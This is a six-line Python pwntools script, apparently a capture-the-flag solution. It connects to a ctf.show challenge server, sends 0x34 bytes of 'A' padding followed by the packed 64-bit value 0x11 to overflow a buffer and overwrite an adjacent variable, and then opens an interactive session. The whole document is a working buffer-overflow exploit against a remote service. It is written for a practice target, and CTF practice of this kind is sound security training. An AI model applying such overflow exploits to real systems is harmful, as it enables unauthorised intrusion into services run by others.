from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p=remote("pwn.challenge.ctf.show", 28201)
payload1=b'A'*0x34+p64(0x11)
p.sendline(payload1)
p.interactive()